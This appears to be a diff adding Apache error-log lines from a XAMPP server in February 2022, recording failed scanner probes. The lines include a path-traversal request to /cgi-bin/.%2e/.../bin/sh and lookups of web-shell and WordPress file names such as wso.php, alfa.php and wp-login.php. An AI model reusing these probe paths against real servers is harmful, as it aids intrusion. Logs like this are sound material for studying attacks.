+[Tue Feb 08 04:32:21.629424 2022] [php7:notice] [pid 2356:tid 1536] [client 178.73.215.171:3726] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 08 04:32:21.629424 2022] [php7:notice] [pid 2356:tid 1536] [client 178.73.215.171:3726] PHP Stack trace:
+[Tue Feb 08 04:32:21.629424 2022] [php7:notice] [pid 2356:tid 1536] [client 178.73.215.171:3726] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 08 04:46:05.415903 2022] [php7:error] [pid 2356:tid 1536] [client 37.120.150.98:1067] script 'C:/xampp/htdocs/test6956.php' not found or unable to stat
+[Tue Feb 08 07:05:58.416331 2022] [core:error] [pid 2356:tid 1516] [client 45.146.165.37:49646] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Tue Feb 08 11:21:09.722322 2022] [php7:notice] [pid 2356:tid 1536] [client 45.146.164.178:61443] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 08 11:21:09.722322 2022] [php7:notice] [pid 2356:tid 1536] [client 45.146.164.178:61443] PHP Stack trace:
+[Tue Feb 08 11:21:09.722322 2022] [php7:notice] [pid 2356:tid 1536] [client 45.146.164.178:61443] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 08 13:59:52.235290 2022] [php7:notice] [pid 2356:tid 1516] [client 45.146.164.178:61443] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 08 13:59:52.235290 2022] [php7:notice] [pid 2356:tid 1516] [client 45.146.164.178:61443] PHP Stack trace:
+[Tue Feb 08 13:59:52.235290 2022] [php7:notice] [pid 2356:tid 1516] [client 45.146.164.178:61443] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 08 15:55:26.965936 2022] [php7:notice] [pid 2356:tid 1520] [client 209.17.96.2:55753] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 08 15:55:26.965936 2022] [php7:notice] [pid 2356:tid 1520] [client 209.17.96.2:55753] PHP Stack trace:
+[Tue Feb 08 15:55:26.965936 2022] [php7:notice] [pid 2356:tid 1520] [client 209.17.96.2:55753] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 08 21:55:39.342365 2022] [php7:error] [pid 2356:tid 1516] [client 159.65.39.111:34934] script 'C:/xampp/htdocs/old-index.php' not found or unable to stat, referer: stevenover.land
+[Tue Feb 08 21:56:33.079487 2022] [php7:error] [pid 2356:tid 1436] [client 159.65.39.111:39996] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: stevenover.land
+[Tue Feb 08 21:58:20.573253 2022] [php7:error] [pid 2356:tid 1516] [client 51.68.141.94:58005] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Wed Feb 09 01:41:09.581275 2022] [php7:notice] [pid 2356:tid 1544] [client 185.212.131.64:32884] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 01:41:09.581275 2022] [php7:notice] [pid 2356:tid 1544] [client 185.212.131.64:32884] PHP Stack trace:
+[Wed Feb 09 01:41:09.581275 2022] [php7:notice] [pid 2356:tid 1544] [client 185.212.131.64:32884] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 02:36:22.439794 2022] [php7:notice] [pid 2356:tid 1440] [client 80.82.70.228:60000] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 02:36:22.439794 2022] [php7:notice] [pid 2356:tid 1440] [client 80.82.70.228:60000] PHP Stack trace:
+[Wed Feb 09 02:36:22.439794 2022] [php7:notice] [pid 2356:tid 1440] [client 80.82.70.228:60000] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 03:13:04.861848 2022] [core:error] [pid 2356:tid 1544] [client 45.146.165.37:49196] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed Feb 09 04:59:09.330729 2022] [php7:notice] [pid 2356:tid 1536] [client 104.140.188.54:62624] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 04:59:09.330729 2022] [php7:notice] [pid 2356:tid 1536] [client 104.140.188.54:62624] PHP Stack trace:
+[Wed Feb 09 04:59:09.330729 2022] [php7:notice] [pid 2356:tid 1536] [client 104.140.188.54:62624] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 06:05:57.886316 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:41826] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 06:05:57.886316 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:41826] PHP Stack trace:
+[Wed Feb 09 06:05:57.886316 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:41826] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 06:06:04.571197 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:49968] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 06:06:04.571197 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:49968] PHP Stack trace:
+[Wed Feb 09 06:06:04.571197 2022] [php7:notice] [pid 2356:tid 1536] [client 47.90.180.16:49968] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 06:25:34.269139 2022] [php7:error] [pid 2356:tid 1440] [client 45.130.228.242:35594] script 'C:/xampp/htdocs/shx.php' not found or unable to stat, referer: http://simplesite.com
+[Wed Feb 09 10:05:56.712616 2022] [php7:error] [pid 2356:tid 1444] [client 39.103.157.70:47576] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Wed Feb 09 11:03:43.151988 2022] [php7:error] [pid 2356:tid 1536] [client 92.204.218.48:44828] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Wed Feb 09 12:10:36.511413 2022] [php7:error] [pid 2356:tid 1536] [client 184.168.114.51:50287] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Wed Feb 09 16:04:22.032109 2022] [php7:notice] [pid 2356:tid 1444] [client 209.17.96.106:51678] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 16:04:22.032109 2022] [php7:notice] [pid 2356:tid 1444] [client 209.17.96.106:51678] PHP Stack trace:
+[Wed Feb 09 16:04:22.032109 2022] [php7:notice] [pid 2356:tid 1444] [client 209.17.96.106:51678] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 19:31:45.934131 2022] [php7:notice] [pid 2356:tid 1444] [client 178.62.26.132:33226] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 09 19:31:45.934131 2022] [php7:notice] [pid 2356:tid 1444] [client 178.62.26.132:33226] PHP Stack trace:
+[Wed Feb 09 19:31:45.934131 2022] [php7:notice] [pid 2356:tid 1444] [client 178.62.26.132:33226] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 09 19:31:46.293318 2022] [php7:error] [pid 2356:tid 1444] [client 178.62.26.132:33414] script 'C:/xampp/htdocs/system_api.php' not found or unable to stat
+[Wed Feb 09 21:40:16.484653 2022] [php7:error] [pid 2356:tid 1444] [client 151.106.116.80:37428] script 'C:/xampp/htdocs/hehehe.php' not found or unable to stat, referer: http://simplesite.com
+[Wed Feb 09 21:40:20.997849 2022] [php7:error] [pid 2356:tid 1440] [client 151.106.116.97:39124] script 'C:/xampp/htdocs/hehehe.php' not found or unable to stat, referer: http://simplesite.com
+[Wed Feb 09 21:40:27.793998 2022] [php7:error] [pid 2356:tid 1444] [client 151.106.116.71:40756] script 'C:/xampp/htdocs/hehehe.php' not found or unable to stat, referer: http://simplesite.com
+[Wed Feb 09 23:39:12.394135 2022] [core:error] [pid 2356:tid 1480] [client 45.146.165.37:38426] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Thu Feb 10 01:28:23.967623 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:57914] script 'C:/xampp/htdocs/php.php' not found or unable to stat
+[Thu Feb 10 01:28:27.840565 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:45086] script 'C:/xampp/htdocs/phpinfo.php' not found or unable to stat
+[Thu Feb 10 01:28:30.762840 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:56572] script 'C:/xampp/htdocs/info.php' not found or unable to stat
+[Thu Feb 10 01:28:40.687251 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:37222] script 'C:/xampp/htdocs/test.php' not found or unable to stat
+[Thu Feb 10 01:28:43.467023 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:47222] script 'C:/xampp/htdocs/i.php' not found or unable to stat
+[Thu Feb 10 01:28:46.247772 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:56838] script 'C:/xampp/htdocs/asdf.php' not found or unable to stat
+[Thu Feb 10 01:29:03.964918 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:53016] script 'C:/xampp/htdocs/temp.php' not found or unable to stat
+[Thu Feb 10 01:29:14.368568 2022] [php7:error] [pid 2356:tid 1480] [client 45.9.20.65:54400] script 'C:/xampp/htdocs/linusadmin-phpinfo.php' not found or unable to stat
+[Thu Feb 10 02:19:27.506934 2022] [authz_core:error] [pid 2356:tid 1480] [client 5.8.10.202:33628] AH01630: client denied by server configuration: C:/xampp/htdocs/server-status
+[Thu Feb 10 06:32:54.248626 2022] [php7:error] [pid 2356:tid 1476] [client 94.130.219.217:54150] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Thu Feb 10 06:33:26.522899 2022] [php7:error] [pid 2356:tid 1476] [client 81.179.97.72:23774] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Thu Feb 10 07:05:28.149944 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:43638] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 07:05:28.149944 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:43638] PHP Stack trace:
+[Thu Feb 10 07:05:28.149944 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:43638] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 07:05:39.634220 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:59552] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 07:05:39.634220 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:59552] PHP Stack trace:
+[Thu Feb 10 07:05:39.634220 2022] [php7:notice] [pid 2356:tid 1480] [client 208.100.26.232:59552] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 08:28:18.005087 2022] [negotiation:error] [pid 2356:tid 1476] [client 130.255.166.26:26041] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 08:28:18.301803 2022] [negotiation:error] [pid 2356:tid 1476] [client 130.255.166.79:36055] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 08:28:18.614135 2022] [negotiation:error] [pid 2356:tid 1476] [client 130.255.166.69:13745] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Thu Feb 10 15:45:42.384654 2022] [php7:notice] [pid 2356:tid 1496] [client 23.16.51.145:60755] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Thu Feb 10 17:59:32.680561 2022] [negotiation:error] [pid 2356:tid 1476] [client 93.158.91.234:4533] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 17:59:32.977272 2022] [negotiation:error] [pid 2356:tid 1476] [client 93.158.91.201:60821] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 17:59:33.289600 2022] [negotiation:error] [pid 2356:tid 1476] [client 93.158.91.209:49879] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 10 20:04:55.208553 2022] [php7:notice] [pid 2356:tid 1488] [client 92.118.161.25:64400] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 20:04:55.208553 2022] [php7:notice] [pid 2356:tid 1488] [client 92.118.161.25:64400] PHP Stack trace:
+[Thu Feb 10 20:04:55.208553 2022] [php7:notice] [pid 2356:tid 1488] [client 92.118.161.25:64400] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 20:26:28.390838 2022] [php7:notice] [pid 2356:tid 1488] [client 209.17.96.178:51997] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 10 20:26:28.390838 2022] [php7:notice] [pid 2356:tid 1488] [client 209.17.96.178:51997] PHP Stack trace:
+[Thu Feb 10 20:26:28.390838 2022] [php7:notice] [pid 2356:tid 1488] [client 209.17.96.178:51997] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 10 23:07:27.856295 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:53321] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:07:33.166711 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:59206] script 'C:/xampp/htdocs/style.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:07:40.869303 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:59229] script 'C:/xampp/htdocs/s_e.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:08:13.847367 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:56990] script 'C:/xampp/htdocs/s_ne.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:08:23.093991 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:60728] script 'C:/xampp/htdocs/1index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:08:34.686919 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:53975] script 'C:/xampp/htdocs/3index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:08:36.779463 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50523] script 'C:/xampp/htdocs/wikindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:08:56.869447 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:64473] script 'C:/xampp/htdocs/radio.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:12.590855 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:51220] script 'C:/xampp/htdocs/lock360.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:17.090215 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:65077] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:26.852167 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:58501] script 'C:/xampp/htdocs/old-index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:29.962679 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:52499] script 'C:/xampp/htdocs/xmrlpc.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:31.900039 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:60920] script 'C:/xampp/htdocs/xmlrpcs.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:36.414039 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:54551] script 'C:/xampp/htdocs/wp-admin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:44.668071 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62526] script 'C:/xampp/htdocs/qindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:09:52.415559 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50191] script 'C:/xampp/htdocs/doc.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:06.411399 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:63605] script 'C:/xampp/htdocs/wp_wrong_datlib.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:07.895895 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50585] script 'C:/xampp/htdocs/beence.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:08.551767 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:55419] script 'C:/xampp/htdocs/ups.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:10.457895 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62076] script 'C:/xampp/htdocs/wp-signin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:11.754023 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:54592] script 'C:/xampp/htdocs/media-admin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:19.050599 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:55657] script 'C:/xampp/htdocs/export.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:10:53.238903 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:60438] script 'C:/xampp/htdocs/defau1t.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:11:09.158439 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62162] script 'C:/xampp/htdocs/css.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:11:10.610727 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:60167] script 'C:/xampp/htdocs/moduless.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:11:46.264007 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:49404] script 'C:/xampp/htdocs/wp-booking.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:13:30.156279 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:63355] script 'C:/xampp/htdocs/config.bak.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:13:47.993655 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:49532] script 'C:/xampp/htdocs/legion.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:14:12.876775 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:54035] script 'C:/xampp/htdocs/wp-plugins.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:14:29.748887 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:53858] script 'C:/xampp/htdocs/gank.php.PhP' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:03.725399 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:59939] script 'C:/xampp/htdocs/archives.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:06.318631 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50863] script 'C:/xampp/htdocs/xindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:10.349511 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:52149] script 'C:/xampp/htdocs/defau11.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:29.001847 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62451] script 'C:/xampp/htdocs/system_log.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:31.672183 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57897] script 'C:/xampp/htdocs/wp-backup-sql-302.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:56.860791 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/about.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.016951 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/shells.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.188727 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/olux.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.344887 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/xleet.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.516663 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/wso.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.672823 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/shell.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:57.828983 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/up.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.000759 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/upload.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.156919 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/1.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.313079 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/x.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.469239 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/z.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.641015 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/a.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.798151 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/test.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:58.954311 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/wp.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:59.110471 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/alfa.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:15:59.282247 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57708] script 'C:/xampp/htdocs/config.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:01.890119 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:63681] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:02.389831 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:49998] script 'C:/xampp/htdocs/style.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:04.108567 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:64197] script 'C:/xampp/htdocs/s_e.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:11.232391 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:63392] script 'C:/xampp/htdocs/s_ne.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:15.762007 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:59626] script 'C:/xampp/htdocs/1index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:20.355063 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:55764] script 'C:/xampp/htdocs/3index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:16:40.834471 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62462] script 'C:/xampp/htdocs/wikindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:00.105591 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:65434] script 'C:/xampp/htdocs/radio.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:01.042551 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:51872] script 'C:/xampp/htdocs/lock360.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:05.509703 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:60701] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:09.618663 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50938] script 'C:/xampp/htdocs/old-index.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:10.274535 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:54379] script 'C:/xampp/htdocs/xmrlpc.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:11.523815 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:49952] script 'C:/xampp/htdocs/xmlrpcs.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:15.273607 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:64023] script 'C:/xampp/htdocs/wp-admin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:16.805927 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50893] script 'C:/xampp/htdocs/qindex.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:45.205575 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:62306] script 'C:/xampp/htdocs/doc.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:49.648327 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:57964] script 'C:/xampp/htdocs/wp_wrong_datlib.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:17:52.224967 2022] [php7:error] [pid 2356:tid 1484] [client 65.108.101.14:50464] script 'C:/xampp/htdocs/beence.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:18:05.065223 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:64198] script 'C:/xampp/htdocs/ups.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:18:49.409783 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:57654] script 'C:/xampp/htdocs/wp-signin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:20:03.016775 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:53192] script 'C:/xampp/htdocs/media-admin.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:20:06.312727 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:54038] script 'C:/xampp/htdocs/export.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:20:25.682423 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:54268] script 'C:/xampp/htdocs/defau1t.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:20:26.431991 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:65448] script 'C:/xampp/htdocs/css.php' not found or unable to stat, referer: www.bing.com
+[Thu Feb 10 23:20:30.338919 2022] [php7:error] [pid 2356:tid 1476] [client 65.108.101.14:52202] script 'C:/xampp/htdocs/moduless.php' not found or unable to stat, referer: www.bing.com
